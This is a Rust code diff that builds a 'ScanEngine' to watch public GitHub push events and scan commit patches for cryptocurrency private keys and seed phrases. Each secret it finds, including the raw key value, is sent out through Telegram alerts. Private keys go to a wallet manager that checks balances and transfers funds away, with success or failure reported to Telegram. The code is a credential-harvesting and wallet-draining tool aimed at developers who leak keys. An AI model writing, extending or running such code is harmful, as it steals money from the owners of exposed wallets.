@@ -1,103 +1,128 @@
 use crate::config::Config;
-use crate::models::github::{CommitDetail, GitHubEvent};
-use reqwest::Client;
+use crate::core::cache::CacheManager;
+use crate::models::github::{GitHubEvent};
+use crate::patterns::matcher::PatternMatcher;
+use crate::scanner::commits::CommitFetcher;
+use crate::scanner::events::GitHubEventsPoller;
+use crate::scanner::files::should_scan_file;
+use crate::models::scan::{CryptoSecret, SecretType};
+use crate::telegram::alerts::TelegramAlerts;
+use crate::wallet::manager::WalletManager;
 use std::sync::Arc;
-use std::time::Duration;
-use futures::stream::{self, StreamExt};
 use tracing::{info, warn};
 
-#[derive(Clone)]
-pub struct CommitFetcher {
-    client: Client,
+pub struct ScanEngine {
     config: Arc<Config>,
+    cache: Arc<CacheManager>,
+    matcher: Arc<PatternMatcher>,
+    telegram: Arc<TelegramAlerts>,
+    wallet_manager: Arc<WalletManager>,
 }
 
-#[derive(Debug, Clone)]
-pub struct CommitWithRepo {
-    pub commit: CommitDetail,
-    pub repo_name: String,
-}
-
-impl CommitFetcher {
-    pub fn new(config: Arc<Config>) -> Self {
-        let client = Client::builder()
-            .pool_max_idle_per_host(10)
-            .tcp_keepalive(Duration::from_secs(60))
-            .timeout(Duration::from_secs(15))
-            .user_agent("git-scanner/1.0")
-            .build()
-            .unwrap();
-        
-        Self { client, config }
+impl ScanEngine {
+    pub fn new(
+        config: Arc<Config>,
+        cache: Arc<CacheManager>,
+        telegram: Arc<TelegramAlerts>,
+        wallet_manager: Arc<WalletManager>,
+    ) -> Arc<Self> {
+        Arc::new(Self {
+            config,
+            cache,
+            matcher: Arc::new(PatternMatcher::new()),
+            telegram,
+            wallet_manager,
+        })
     }
     
-    pub async fn fetch_commits(&self, event: &GitHubEvent) -> Vec<CommitWithRepo> {
+    pub async fn run(self: Arc<Self>) {
+        info!("🚀 Scan engine started");
+        
+        let poller = GitHubEventsPoller::new(self.config.clone());
+        let fetcher = CommitFetcher::new(self.config.clone());
+        
+        let engine = self.clone();
+        
+        poller.poll(move |event: GitHubEvent| {
+            let engine = engine.clone();
+            let fetcher = fetcher.clone();
+            
+            tokio::spawn(async move {
+                engine.process_event(event, fetcher).await;
+            });
+        }).await;
+    }
+    
+    async fn process_event(&self, event: GitHubEvent, fetcher: CommitFetcher) {
         let repo_name = event.repo.name.clone();
         
-        let commits = match &event.payload.commits {
-            Some(commits) => commits.clone(),
-            None => return vec![],
-        };
+        info!("📦 Push event from: {}", repo_name);
         
-        let results = stream::iter(commits)
-            .map(|commit| {
-                let client = self.client.clone();
-                let config = self.config.clone();
-                let repo_name = repo_name.clone();
-                let sha = commit.sha.clone();
-                
-                async move {
-                    fetch_single_commit(client, config, &repo_name, &sha).await
+        let commits = fetcher.fetch_commits(&event).await;
+        
+        for commit_with_repo in commits {
+            let repo = commit_with_repo.repo_name.clone();
+            let commit = commit_with_repo.commit;
+            let commit_sha = commit.sha.clone();
+            
+            let files = match &commit.files {
+                Some(files) => files,
+                None => continue,
+            };
+            
+            for file in files {
+                if !should_scan_file(&file.filename) {
+                    continue;
                 }
-            })
-            .buffer_unordered(10)
-            .collect::<Vec<_>>()
-            .await;
-        
-        let commit_details: Vec<CommitWithRepo> = results
-            .into_iter()
-            .filter_map(|r| r.ok())
-            .flatten()
-            .map(|commit| CommitWithRepo {
-                commit,
-                repo_name: repo_name.clone(),
-            })
-            .collect();
-        
-        info!("📦 Fetched {} commit details", commit_details.len());
-        commit_details
+                
+                if let Some(patch) = &file.patch {
+                    let secrets = self.matcher.scan_content(patch);
+                    
+                    if !secrets.is_empty() {
+                        for secret in secrets {
+                            info!("🔑 SECRET FOUND in {} ({})", file.filename, repo);
+                            
+                            self.telegram.send_secret_found(
+                                &repo,
+                                &commit_sha,
+                                &file.filename,
+                                &secret.secret_type.to_string(),
+                                &secret.value,
+                            ).await;
+                            
+                            self.process_secret(secret).await;
+                        }
+                    }
+                }
+            }
+        }
     }
-}
-
-async fn fetch_single_commit(
-    client: Client,
-    config: Arc<Config>,
-    repo_name: &str,
-    sha: &str,
-) -> Result<Option<CommitDetail>, reqwest::Error> {
-    let url = format!(
-        "{}/repos/{}/commits/{}",
-        config.github_api_url, repo_name, sha
-    );
     
-    let request = client
-        .get(&url)
-        .header("Accept", "application/vnd.github+json")
-        .header("X-GitHub-Api-Version", "2022-11-28");
-    
-    let request = if let Some(token) = &config.github_token {
-        request.header("Authorization", format!("Bearer {}", token))
-    } else {
-        request
-    };
-    
-    let response = request.send().await?;
-    
-    if response.status().is_success() {
-        let commit = response.json::<CommitDetail>().await?;
-        Ok(Some(commit))
-    } else {
-        warn!("Failed to fetch commit {}: {}", sha, response.status());
-        Ok(None)
+    async fn process_secret(&self, secret: CryptoSecret) {
+        match secret.secret_type {
+            SecretType::PrivateKey => {
+                match self.wallet_manager.process_private_key(&secret.value).await {
+                    Ok((wallet_info, transfer_result)) => {
+                        self.telegram.send_balance_detected(&wallet_info).await;
+                        
+                        if let Some(transfer) = transfer_result {
+                            if transfer.success {
+                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
+                            } else {
+                                if let Some(error) = &transfer.error {
+                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
+                                }
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        warn!("Failed to process private key: {}", e);
+                    }
+                }
+            }
+            SecretType::SeedPhrase => {
+                warn!("Seed phrase processing not yet implemented");
+            }
+        }
     }
 }
